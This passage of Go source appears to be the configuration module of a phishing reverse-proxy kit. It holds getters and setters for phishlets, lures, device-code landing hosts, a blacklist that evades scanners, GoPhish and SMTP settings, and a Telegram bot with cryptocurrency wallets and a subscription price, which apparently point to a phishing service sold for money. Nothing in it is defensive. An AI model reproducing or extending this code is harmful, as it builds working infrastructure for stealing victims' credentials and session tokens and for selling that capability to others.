				if host == l.Hostname || host == pl.GetLandingPhishHost() {
					if l.Path == path {
						return l, nil
					}
				}
			}
		}
	}
	return nil, fmt.Errorf("lure for path '%s' not found", path)
}

func (c *Config) GetPhishlet(site string) (*Phishlet, error) {
	pl, ok := c.phishlets[site]
	if !ok {
		return nil, fmt.Errorf("phishlet '%s' not found", site)
	}
	return pl, nil
}

func (c *Config) GetPhishletNames() []string {
	return c.phishletNames
}

func (c *Config) GetSiteDomain(site string) (string, bool) {
	if o, ok := c.phishletConfig[site]; ok {
		return o.Hostname, ok
	}
	return "", false
}

func (c *Config) GetSiteUnauthUrl(site string) (string, bool) {
	if o, ok := c.phishletConfig[site]; ok {
		return o.UnauthUrl, ok
	}
	return "", false
}

func (c *Config) GetBaseDomain() string {
	return c.general.Domain
}

// GetDCLandingHost returns the HTTPS hostname to use for device-code landing
// page URLs.  It prefers the first enabled phishlet's landing subdomain (which
// is always in activeHostnames and has a TLS cert) over the bare root domain,
// which is never registered with certmagic and therefore causes TLS failures.
func (c *Config) GetDCLandingHost() string {
	sites := c.GetEnabledSites()
	for _, site := range sites {
		pl, err := c.GetPhishlet(site)
		if err != nil {
			continue
		}
		if h := pl.GetLandingPhishHost(); h != "" {
			return h
		}
	}
	return c.general.Domain
}

func (c *Config) GetServerExternalIP() string {
	return c.general.ExternalIpv4
}

func (c *Config) GetServerBindIP() string {
	return c.general.BindIpv4
}

func (c *Config) GetHttpsPort() int {
	return c.general.HttpsPort
}

func (c *Config) GetDefaultRedirectUrl() string {
	return c.general.DefaultRedirectUrl
}

func (c *Config) SetDefaultRedirectUrl(url string) {
	c.general.DefaultRedirectUrl = url
	c.cfg.Set(CFG_GENERAL, c.general)
	c.cfg.WriteConfig()
	log.Info("default redirect URL set to: %s", url)
}

func (c *Config) GetAdminPassword() string {
	return c.general.AdminPassword
}

func (c *Config) GetRedirectChainSecret() []byte {
	return []byte(c.general.RedirectChainSecret)
}

func (c *Config) SetAdminPassword(password string) {
	c.general.AdminPassword = password
	c.cfg.Set(CFG_GENERAL, c.general)
	c.cfg.WriteConfig()
	log.Info("admin panel password updated")
}

func (c *Config) GetDnsPort() int {
	return c.general.DnsPort
}

func (c *Config) GetRedirectorsDir() string {
	return c.redirectorsDir
}

func (c *Config) GetBlacklistMode() string {
	return c.blacklistConfig.Mode
}

func (c *Config) GetBlacklistFeedURLs() []string {
	if c.blacklistConfig == nil {
		return nil
	}
	return c.blacklistConfig.FeedURLs
}

func (c *Config) GetBlacklistFeedInterval() int {
	if c.blacklistConfig == nil {
		return 0
	}
	return c.blacklistConfig.FeedInterval
}

func (c *Config) GetBlacklistWhitelist() []string {
	if c.blacklistConfig == nil {
		return nil
	}
	return c.blacklistConfig.Whitelist
}

func (c *Config) GetBlacklistEnableASNLookup() bool {
	if c.blacklistConfig == nil {
		return false
	}
	return c.blacklistConfig.EnableASNLookup
}

func (c *Config) GetBlacklistASNLookupURL() string {
	if c.blacklistConfig == nil {
		return ""
	}
	return c.blacklistConfig.ASNLookupURL
}

func (c *Config) GetBlacklistASNWhitelist() []int {
	if c.blacklistConfig == nil {
		return nil
	}
	return c.blacklistConfig.ASNWhitelist
}

func (c *Config) IsAutocertEnabled() bool {
	return c.general.Autocert
}

func (c *Config) GetGoPhishAdminUrl() string {
	return c.gophishConfig.AdminUrl
}

func (c *Config) GetGoPhishApiKey() string {
	return c.gophishConfig.ApiKey
}

func (c *Config) GetGoPhishInsecureTLS() bool {
	return c.gophishConfig.InsecureTLS
}

func (c *Config) GetDnsEntries() string {
	out := ""
	for k, v := range c.dnsentries {
		out += fmt.Sprintf("%s -> %s: %s; ", k, v.Type, v.Value)
	}
	return out
}

func (c *Config) GetBotToken() string             { return c.general.BotToken }
func (c *Config) GetBotAdminChatId() int64        { return c.general.BotAdminChatId }
func (c *Config) GetCryptoBTC() string            { return c.general.CryptoBTC }
func (c *Config) GetCryptoETH() string            { return c.general.CryptoETH }
func (c *Config) GetCryptoUSDT() string           { return c.general.CryptoUSDT }
func (c *Config) GetSubPrice() int                { p := c.general.SubPrice; if p == 0 { return 150 }; return p }
func (c *Config) GetDefaultPhishlet() string      { return c.general.DefaultPhishlet }

func (c *Config) SetBotConfig(token string, adminChatId int64, btc, eth, usdt string, price int) {
	c.general.BotToken = token
	c.general.BotAdminChatId = adminChatId
	c.general.CryptoBTC = btc
	c.general.CryptoETH = eth
	c.general.CryptoUSDT = usdt
	c.general.SubPrice = price
	c.cfg.Set(CFG_GENERAL, c.general)
	c.cfg.WriteConfig()
}

func (c *Config) SetBotToken(v string)          { c.general.BotToken = v; c.cfg.Set(CFG_GENERAL, c.general); c.cfg.WriteConfig() }
func (c *Config) SetBotAdminChatId(v int64)     { c.general.BotAdminChatId = v; c.cfg.Set(CFG_GENERAL, c.general); c.cfg.WriteConfig() }
func (c *Config) SetCryptoBTC(v string)         { c.general.CryptoBTC = v; c.cfg.Set(CFG_GENERAL, c.general); c.cfg.WriteConfig() }
func (c *Config) SetCryptoETH(v string)         { c.general.CryptoETH = v; c.cfg.Set(CFG_GENERAL, c.general); c.cfg.WriteConfig() }
func (c *Config) SetCryptoUSDT(v string)        { c.general.CryptoUSDT = v; c.cfg.Set(CFG_GENERAL, c.general); c.cfg.WriteConfig() }
func (c *Config) SetSubPrice(v int)             { c.general.SubPrice = v; c.cfg.Set(CFG_GENERAL, c.general); c.cfg.WriteConfig() }
func (c *Config) SetDefaultPhishlet(v string)   { c.general.DefaultPhishlet = v; c.cfg.Set(CFG_GENERAL, c.general); c.cfg.WriteConfig() }
func (c *Config) GetCloudflareMode() bool       { return c.general.CloudflareMode }
func (c *Config) SetCloudflareMode(v bool)      { c.general.CloudflareMode = v; c.cfg.Set(CFG_GENERAL, c.general); c.cfg.WriteConfig() }
func (c *Config) GetSmtpHost() string  { return c.general.SmtpHost }
func (c *Config) GetSmtpPort() int     { return c.general.SmtpPort }
func (c *Config) GetSmtpUser() string  { return c.general.SmtpUser }
func (c *Config) GetSmtpPass() string  { return c.general.SmtpPass }
func (c *Config) GetSmtpFrom() string  { return c.general.SmtpFrom }
func (c *Config) SetSmtp(host string, port int, user, pass, from string) {
	c.general.SmtpHost = host; c.general.SmtpPort = port
	c.general.SmtpUser = user; c.general.SmtpPass = pass; c.general.SmtpFrom = from
	c.cfg.Set(CFG_GENERAL, c.general); c.cfg.WriteConfig()
}
